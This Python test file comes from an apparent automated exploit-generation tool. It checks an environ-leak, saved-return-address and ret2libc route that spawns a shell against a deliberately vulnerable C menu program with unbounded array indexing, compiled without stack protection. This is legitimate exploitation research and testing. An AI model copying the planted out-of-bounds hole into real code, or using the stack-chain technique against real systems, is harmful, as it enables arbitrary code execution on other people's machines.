"""The `environ` route: an arbitrary read that reaches libc also reaches the STACK.

Two things this module pins down, because both cost a debugging round to find:

* a saved return address is told apart from a code pointer that merely lives in a local by the
  bytes BEFORE it decoding as a `call` -- a test nothing about the compiler's register allocation
  or frame layout can change; and
* main's own saved return address points into `__libc_start_call_main`, which no libc exports, so
  it is identified NEGATIVELY -- as the first libc code pointer below `environ` that is not inside
  `__libc_start_main`, which every libc does export, with its size.
"""
import glob
import shutil
import struct
import subprocess

import pytest
from lykos.analyze.poc import rop

_SYS_LIBC = next(iter(glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6")
                      + glob.glob("/lib/x86_64-linux-gnu/libc.so.6")), None)

#: A menu with an unbounded index in BOTH directions -- the arbitrary read and the arbitrary write
#: the route needs -- that also defeats every FSOP plan: `fclose(stderr)` runs `_IO_un_link`, so
#: the FILE the other plans forge is off `_IO_list_all` and exit() never flushes it, and the array
#: is 512 bytes, under House of Cat's 0x390 blob.
_CLOSED_STDERR_MENU = r"""#include <stdio.h>
long table[64];
int main(void){ setvbuf(stdout,0,2,0);
  fclose(stderr);
  for(;;){ printf("1.set 2.get 3.exit\n> ");
    int o; if(scanf("%d",&o)!=1) return 0;
    if(o==1){ long i,v; printf("idx: "); if(scanf("%ld",&i)!=1) return 0;
              printf("val: "); if(scanf("%ld",&v)!=1) return 0;
              table[i]=v; }
    else if(o==2){ long i; printf("idx: "); if(scanf("%ld",&i)!=1) return 0;
                   printf("%ld\n", table[i]); }
    else return 0; } }
"""

_CALL_PROBE = r"""#include <stdio.h>
static void inner(void){ printf("x"); }
int main(void){ inner(); inner(); return 0; }
"""


def _build(tmp_path, src, name="t"):
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    (tmp_path / "t.c").write_text(src)
    exe = tmp_path / name
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-O0", "-w",
                       str(tmp_path / "t.c"), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("build failed")
    return exe


def test_is_return_site_accepts_only_addresses_that_follow_a_call(tmp_path):
    """The whole discriminator, against objdump's own view of the binary. Every address right
    after a `call` must pass; every call TARGET (a function entry, which is what a code pointer in
    a local would be) must fail."""
    exe = _build(tmp_path, _CALL_PROBE)
    blob = exe.read_bytes()
    dis = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe)],
                         capture_output=True, text=True).stdout
    after, targets = [], []
    lines = [ln for ln in dis.splitlines() if ":\t" in ln]
    for i, ln in enumerate(lines):
        addr, _, insn = ln.partition(":\t")
        if not insn.strip().startswith("call"):
            continue
        if i + 1 < len(lines):
            after.append(int(lines[i + 1].split(":")[0].strip(), 16))
        tail = insn.split()[-1]
        if tail.startswith("0x") or tail.isalnum():
            try:
                targets.append(int(insn.split()[1], 16))
            except (ValueError, IndexError):
                pass
    assert after, "no call sites found to test"
    assert all(rop.is_return_site(blob, a) for a in after), after
    assert not any(rop.is_return_site(blob, t) for t in targets), targets


def test_is_return_site_refuses_an_address_outside_executable_memory(tmp_path):
    """A word pointing at .data cannot be a saved return address however it decodes."""
    exe = _build(tmp_path, _CALL_PROBE)
    blob = exe.read_bytes()
    lo, hi = rop.exec_range(blob)
    assert lo < hi
    assert not rop.is_return_site(blob, hi + 0x4000)
    assert not rop.is_return_site(blob, 0)


def test_libc_symbol_ranges_keeps_the_size_that_libc_symbols_drops():
    """The negative identification of main's slot needs `__libc_start_main`'s EXTENT, not just its
    address, and it has to come out of the bytes."""
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    data = open(_SYS_LIBC, "rb").read()
    r = rop.libc_symbol_ranges(data, ("__libc_start_main", "system"))
    assert "__libc_start_main" in r and "system" in r
    for name, (value, size) in r.items():
        assert value > 0 and size > 0, (name, value, size)
    assert r["system"][0] == rop.libc_symbols(data, ("system",))["system"]


def test_environ_stack_targets_names_environ_and_a_system_chain():
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    t = rop.environ_stack_targets(open(_SYS_LIBC, "rb").read())
    assert t, "the host libc should support the environ route"
    assert t["environ_name"] in ("environ", "__environ", "_environ")
    for k in ("environ", "pop_rdi", "binsh", "system"):
        assert t[k] > 0, k


def test_environ_stack_targets_is_empty_without_the_pieces():
    assert rop.environ_stack_targets(b"") == {}
    assert rop.environ_stack_targets(b"\x7fELF" + b"\x00" * 64) == {}


def test_main_return_images_skips_libc_start_mains_own_body():
    """The single exclusion that makes the answer unambiguous."""
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    libc = open(_SYS_LIBC, "rb").read()
    base = 0x7F0000000000
    images, skip = rop.main_return_images(b"\x7fELF", libc, base)
    assert [lbl for lbl, *_ in images] == ["libc", "target"]
    value, size = rop.libc_symbol_ranges(libc, ("__libc_start_main",))["__libc_start_main"]
    assert skip == [(base + value, base + value + size)]


def test_saved_return_slots_walks_down_and_picks_the_call_preceded_word(tmp_path):
    """The walk itself, against a synthetic stack: a code pointer that is NOT a return site is
    skipped, the one that is gets reported, and the order is outermost first."""
    exe = _build(tmp_path, _CALL_PROBE)
    blob = exe.read_bytes()
    lo, hi = rop.exec_range(blob)
    dis = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe)],
                         capture_output=True, text=True).stdout
    lines = [ln for ln in dis.splitlines() if ":\t" in ln]
    ret_site = next(int(lines[i + 1].split(":")[0].strip(), 16)
                    for i, ln in enumerate(lines)
                    if ln.partition(":\t")[2].strip().startswith("call") and i + 1 < len(lines))
    entry = lo                                            # a segment start: never a return site
    top = 0x7FFFFFFFE000
    fake = {top - 0x08: [entry], top - 0x18: [ret_site], top - 0x28: [ret_site]}
    slots = rop.saved_return_slots(lambda a: fake.get(a, []), top,
                                   images=[("target", blob, 0, lo, hi)], span=0x40)
    assert [a for a, _v, _l in slots] == [top - 0x18, top - 0x28]
    assert all(v == ret_site and lbl == "target" for _a, v, lbl in slots)


def test_saved_return_slots_honours_limit_and_skip(tmp_path):
    exe = _build(tmp_path, _CALL_PROBE)
    blob = exe.read_bytes()
    lo, hi = rop.exec_range(blob)
    dis = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe)],
                         capture_output=True, text=True).stdout
    lines = [ln for ln in dis.splitlines() if ":\t" in ln]
    ret_site = next(int(lines[i + 1].split(":")[0].strip(), 16)
                    for i, ln in enumerate(lines)
                    if ln.partition(":\t")[2].strip().startswith("call") and i + 1 < len(lines))
    top = 0x7FFFFFFFE000
    images = [("target", blob, 0, lo, hi)]
    assert len(rop.saved_return_slots(lambda a: [ret_site], top, images=images,
                                      span=0x200, limit=3)) == 3
    assert rop.saved_return_slots(lambda a: [ret_site], top, images=images, span=0x200,
                                  skip=[(lo, hi)]) == []


def test_build_stack_ret2libc_word_order_and_the_alignment_ret():
    """Three words, and a fourth at the FRONT when the parity needs fixing -- the extra `ret` has
    to be consumed before `pop rdi`, not after it."""
    plain = rop.build_stack_ret2libc(pop_rdi=0x11, binsh=0x22, system=0x33)
    assert plain == [0x11, 0x22, 0x33]
    aligned = rop.build_stack_ret2libc(pop_rdi=0x11, binsh=0x22, system=0x33, ret_gadget=0x44)
    assert aligned == [0x44, 0x11, 0x22, 0x33]


def test_the_stack_plan_is_declined_without_the_targets_image():
    """No target bytes means no way to test a return site, and the plan must drop out by name
    rather than scan the stack and write a chain over a guess."""
    from lykos.analyze.poc import leak
    res = leak.indexed_write_fsop(
        "/nonexistent", "/tmp", write_cell=lambda a, v: b"", read_cell=lambda a: b"",
        libc_data=b"", leak_slots=[(0x404000, "printf")], scratch=0x404060,
        plans=("stack",), target_bytes=b"")
    assert not res["ok"]
    assert "FSOP plan" in res["reason"] or "libc" in res["reason"]


def test_environ_route_spawns_a_shell_where_every_file_plan_fails(tmp_path):
    """The live separation, and the reason this plan exists.

    On a target that has closed stderr and whose array is too small for a FILE of our own, the
    setcontext and system plans place every cell and the trigger does NOTHING -- the forged FILE is
    not on `_IO_list_all` any more -- and House of Cat is excluded for room. The stack plan spawns
    a shell on the same target with the same primitive."""
    from lykos.analyze.dynamic import sandbox
    from lykos.analyze.poc import exploit, leak
    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
        pytest.skip("x86-64 + system libc required")
    exe = _build(tmp_path, _CLOSED_STDERR_MENU, "idx")
    blob = exe.read_bytes()
    table, size = exploit.elf_objects_sized(blob)["table"]
    from lykos.analyze.poc import heap
    assert size < heap.CAT_BLOB_MIN, "the array must be too small for House of Cat"

    def run(plans):
        return leak.indexed_write_fsop(
            exe, tmp_path,
            write_cell=lambda a, v: b"1\n%d\n%d\n" % ((a - table) // 8,
                                                      struct.unpack("<q", struct.pack("<Q", v))[0]),
            read_cell=lambda a: b"2\n%d\n" % ((a - table) // 8),
            libc_data=open(_SYS_LIBC, "rb").read(),
            leak_slots=[(a, n) for n, a in rop.got_entries(blob).items()],
            scratch=table, scratch_size=size, exit_seqs=(b"3\n",), plans=plans,
            target_bytes=blob)

    for plan in ("setcontext", "system"):
        bad = run((plan,))
        assert not bad["ok"], f"{plan} should not reach a shell on a closed stderr"
        # The file plan must not spawn a shell on a closed-stderr target. On glibc <= 2.42 it places
        # every cell and the trigger does nothing ("no trigger spawned a shell"); on a libc whose
        # setcontext finisher is unavailable (2.43's moved register-load tail) the setcontext plan
        # instead declines up front -- both are the same verdict: this file plan did not reach L3.
        reason = bad.get("reason") or ""
        assert ("no trigger spawned a shell" in reason
                or "setcontext finisher is unavailable" in reason), reason

    res = run(("stack",))
    assert res["ok"], res.get("reason")
    assert res["plan"] == "stack"
    assert res["fp_name"] == "main's saved return address"
    assert res["finish"] == "system"
    # The slot is a stack address, and the chain is 3 words (or 4 with the alignment ret).
    assert 0x7F0000000000 < int(res["slot"], 16) < 0x800000000000
    assert len(res["cells"]) in (3, 4)
    assert res["targets"]["align"] is res["align"]
